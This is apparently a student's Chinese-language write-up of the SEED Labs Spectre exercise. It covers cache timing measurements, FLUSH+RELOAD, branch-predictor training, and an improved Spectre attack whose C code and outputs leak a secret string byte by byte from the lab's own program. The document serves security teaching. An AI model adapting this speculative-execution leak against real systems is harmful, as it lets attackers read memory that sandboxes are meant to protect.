# Spectre实验

https://seedsecuritylabs.org/Labs_16.04/System/Spectre_Attack/

## 1. Task1 and 2: 利用CPU cache的测信道攻击

Meltdown和Spectre都是利用的CPU cache的测信道攻击来窃取被保护的secret，被用来测信道共计的技术称为：FLUSH+RELOAD。

CPU cache由硬件支持，减少主内存访问时间消耗。

### 1.1. Task1: 访问Cache对比访问内存

访问Cache的速度比访问内存的速度快很多，利用lab提供的`CacheTime.c`文件我们可以对此进行测试。根据代码内容我们可以知道操作如下：

- 代码中有一个10*4096的数组
- 首先会访问`array[3*4096]`和`array[7*4096]`，这样这两个数组元素就会被读到cache中
- 然后按顺序访问array从0到10，并计算访问时间（cycles）

```c
time1 = __rdtscp(&junk);
junk =*addr;
time2 = __rdtscp(&junk) - time1;
```

Caching是以一个cache block为单位的，而不是byte。一个blcok是64 bytes，所以每一个数组元素的大小是4096（远大于64bytes），以此来保证不会有重复载入的cache block。

#### 编译并运行该文件

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native CacheTime.c -o CacheTime
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./CacheTime 
Access time for array[0*4096]: 2660 CPU cycles
Access time for array[1*4096]: 326 CPU cycles
Access time for array[2*4096]: 312 CPU cycles
Access time for array[3*4096]: 142 CPU cycles
Access time for array[4*4096]: 302 CPU cycles
Access time for array[5*4096]: 287 CPU cycles
Access time for array[6*4096]: 306 CPU cycles
Access time for array[7*4096]: 123 CPU cycles
Access time for array[8*4096]: 300 CPU cycles
Access time for array[9*4096]: 290 CPU cycles
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./CacheTime 
Access time for array[0*4096]: 77 CPU cycles
Access time for array[1*4096]: 172 CPU cycles
Access time for array[2*4096]: 164 CPU cycles
Access time for array[3*4096]: 22 CPU cycles
Access time for array[4*4096]: 168 CPU cycles
Access time for array[5*4096]: 170 CPU cycles
Access time for array[6*4096]: 166 CPU cycles
Access time for array[7*4096]: 23 CPU cycles
Access time for array[8*4096]: 168 CPU cycles
Access time for array[9*4096]: 164 CPU cycles
...
```

运行1次（实验要求运行10次多观察观察）就会发现，`array[3*4096]`和`array[7*4096]`的访问时间明显小于其他元素。除去`array[0*4096]`元素，已经在cache中的元素访问时间与不在cache中的元素访问时间差平均为140（这个差每个电脑情况不一样，比如lab中的设定就是80）。

### 1.2. Task2: 利用CPU Cache实现测信道攻击

利用测信道攻击可以读取受害者程序的secret。

- 假设受害者程序使用了secret value作为索引读取一个数组的值
- 假设这个secret value不能被外部访问

使用FLUSH+RELOAD技术读取该secret value。

- 刷新整个cache保证我们要访问的array没有被cache
- 加载受害者程序，该程序会使用secret value作为索引访问array元素。于是该元素会被存到cache中
- 重新加载整个array，计算访问每个元素的时间。如果某个元素访问时间明显快很多，那么该元素很有可能被受害者程序访问过。于是，我们可以找到该secret value

Lab提供的`FlushReload.c`文件便利用了FLUSH+RELOAD技术来找出一个字节的secret value。一个字节的secret有256个可能的值（2^8），直接定义array[256]不可行。因为cache是以一个block（64bytes）为单位，即使只有一个字节被访问，与该字节相关的整个block都会被cache，包括整个array[256]。为了找到这个字节，RELOAD的时候定义`array[k*4096], k=[0, 256]`。如果运行过task1大家就会发现，`array[0*4096]`元素的访问时间时快时慢，这个元素可能与相邻内存中的变量属于同一缓存块，因此可能会由于缓存这些变量而意外缓存。因此在FLUSH+RELOAD中，不会访问该元素。

代码中还定义了一个DELTA为1024以保证程序的一致性。（为啥？？？）

```c
void victim(){
  temp = array[secret*4096 + DELTA];
}
```

#### 编译并运行

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native FlushReload.c -o FlushReload
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./FlushReload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
...
```

运行20次会发现并不是每一次都能找到secret，同时可以根据自己task1实验情况修改时间差（比如我的是120，lab提供的是80）：

```c
/*cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
```

## 2. Task3: 乱序执行和分支预测

### 2.1. 乱序执行

```c
1. data = 0;
2. if (x < size) {
3.   data = data + 5;
4. }
```

以上例子中会根据x的大小判断是否执行if中的语句。假设size为10，x为15，第三行语句就不会执行。

但是到CPU中，情况就不一样了，乱序执行的CPU会执行第三行。

这是因为现代计算机中使用乱序执行优化技术，以最大化地利用执行单元。当所需资源（比如x，size）已就位，CPU会执行并行执行相关语句。在当前操作执行的时候，CPU已经超前执行了其他语句。

第二行包含了两个操作：从内存中加载size的值，比较x和size。如果size的值没有在CPU的cache中，访问速度会很慢。因此CPU会预测比较结果，然后根据预测运行分支。因为这些操作在比较结果还没出来之前就执行了，所以称为乱序执行。

当乱序执行的时候，CPU会存储当前的状态和寄存器的值。在size的值访问到了之后，CPU再检查真实的比较结果。如果预测是正确的，就继续执行，如果预测是错误的，就恢复状态，所有预测的操作都会丢弃。

这个技术显著提升了CPU的性能，但是也引入了风险。因为虽然预测错误会丢弃操作，但是寄存器读取到的预测分支相关内存已经存储到了cache中且没有被丢弃。利用测信道攻击可以窃取该内存内容（很有可能有secret）。

### 2.2. 实验代码

```c
int main(){
  int i;
  // FLUSH the probing array
  flushSideChannel();
  // Train the CPU to take the true branch inside victim()
  // 使用比size（10）小的i训练CPU预测true分支
  for (i = 0; i < 10; i++) {
    _mm_clflush(&size);
    victim(i);
  }
  // Exploit the out-of-order execution
  _mm_clflush(&size);
  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i*4096 + DELTA]);
  // 使用比10大的97调用victim函数并刷新size的值，这样CPU要等待size的值，并且进入预测执行。
  victim(97);
  // RELOAD the probing array
  reloadSideChannel();
  return (0);
}
```

### 2.3. Task3

```c
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreExperiment 
array[97*4096 + 1024] is in cache.
The Secret = 97.
```

- 注释掉`_mm_clflush(&size);`和`_mm_clflush(&size);`
  - 因为size的值已经在cache中，CPU不用等待直接判断除了if的结果为false，不需要分支预测执行。因此测信道攻击失败
- 改为`victim(i+20)`
  - i+20比size大，CPU预测执行被训练为预测false。当调用victim函数的时候，虽然要等待size的值，但是CPU预测正确了执行语句，测信道攻击同样失败。

## 3. Task 4: Spectre攻击

因为CPU不清除预测错误的执行内容，导致测信道攻击的可能性。利用这个漏洞，我们可以窃取同一个程序或不同程序的secret。该lab只实验了同一个程序的。

原理介绍：当浏览器访问不同服务器的网页的时候，它们是由同一个程序打开。浏览器的sandbox会为这些网页提供一个隔离环境，让它们不能互相访问。大多数软件的保护都是通过判断访问是否被granted。利用Spectre，可以让CPUs乱序执行，使其执行true分支即使访问被禁止了。

### 3.1. 攻击步骤

```c
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t restrictedAccess(size_t x){
  if (x < buffer_size) {
    return buffer[x];
  } else {
    return 0;
  }
}
```

被攻击的对象有两个域：一个被限制访问，一个没有限制访问。被限制访问的域由sandbox保护（if-condition）。用户提供x，如果x小于buffer的大小，sandbox返回buffer[x]，反之则什么都不会返回。因此sandbox永远不会返回超过size的buffer给用户。

攻击者只能通过sandbox去访问被限制访问的域。

### 3.2. 实验代码 SpectreAttack.c

代码中定义了secret的变量，假设用户不能直接访问secret变量或者buffer_size变量，但是可以从cache刷新buffer_size。目标是利用Spectre攻击读取secret的第一个字节。

```c
char*secret = "Some Secret Value";
```

`size_t larger_x = (size_t)(secret - (char*)buffer);`计算secret到buffer的偏移（假设攻击者已经知道secret的地址）。偏移大于10的话会调用restrictedAccess函数。因为代码会训练CPU预测true的分支，所以CPU会返回包含secret的buffer[larger_x]。虽然表面上看程序执行返回了0，但是cache中已经存放了buffer [larger_x]的内容。

#### 编译执行代码

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native SpectreAttack.c -o SpectreAttack
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreAttack 
array[0*4096 + 1024] is in cache.
The Secret = 0.
array[83*4096 + 1024] is in cache.
The Secret = 83.
```

前面提到array[0*4096]确实会影响结果，应该避免遍历它。可以将循环改成[1， 256]，就只会出现`The Secret = 83`的结果了。有时候不一定会出现想要的解决，需要执行多次。

## 4. 提高攻击准确性

从前面的实验可以看出，结果会有noise并且不一定准确。这是因为CPU有时候会载入其他变量或者时间差不对。为了得到想要的结果通常需要执行多次程序。这部分实验是提供自动化程序。

为了256个数组元素创建分数，如果攻击程序得出k是secret的结果，就将scores[k]加1。运行多次后，分数最高的k即为secret的位置。

```c
for (i = 0; i < 256; i++) 
  scores[i] = 0;

for (i = 0; i < 1000; i++) {
  spectreAttack(larger_x);
	reloadSideChannelImproved();
}

int max = 0;
for (i = 0; i < 256; i++){
	if(scores[max] < scores[i])
	max = i;
}
```

但是scores[0]总是得到最高的分数，同之前的原因一样。因此，在`void reloadSideChannelImproved()`函数中，遍历256个数组元素的时候，应该去掉0的位置：[1，256]。

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native SpectreAttackImproved.c -o SpectreAttackImproved
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreAttackImproved Reading secret value at 0xffffe80c = The  secret value is 83
The number of hits is 7
```

## 5. 打印全部的secret

前一个实验只打印了secret的第一个单词，修改程序使其打印整个字符串。实验中打印的是数字，将数字转化成字母

```c
int main() {
  int i;
  uint8_t s;
  
  for (int n = 0; n < 17; ++n)
  {
    size_t larger_x = (size_t)(secret-(char*)buffer+n);
    flushSideChannel();
    for(i=0;i<256; i++) scores[i]=0; 
    for (i = 0; i < 1000; i++) {
      spectreAttack(larger_x);
      reloadSideChannelImproved();
    }
    int max = 0;
    for (i = 0; i < 256; i++){
     if(scores[max] < scores[i])  
       max = i;
    }
    printf("The  secret value is '%c'\t", (char)max);
    printf("The number of hits is %d\n", scores[max]);
  }
  return (0); 
}
```

编译并执行可得，需要执行多次才可以得到全部的结果：

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreAttackImproved 
The  secret value is 'S'	The number of hits is 7
The  secret value is 'o'	The number of hits is 4
The  secret value is 'm'	The number of hits is 4
The  secret value is 'e'	The number of hits is 1
The  secret value is ' '	The number of hits is 2
The  secret value is 'S'	The number of hits is 3
The  secret value is 'e'	The number of hits is 3
The  secret value is 'c'	The number of hits is 1
The  secret value is 'r'	The number of hits is 1
The  secret value is 'e'	The number of hits is 3
The  secret value is 't'	The number of hits is 4
The  secret value is ' '	The number of hits is 3
The  secret value is 'V'	The number of hits is 1
The  secret value is 'a'	The number of hits is 4
The  secret value is 'l'	The number of hits is 1
The  secret value is 'u'	The number of hits is 2
The  secret value is 'e'	The number of hits is 2

```



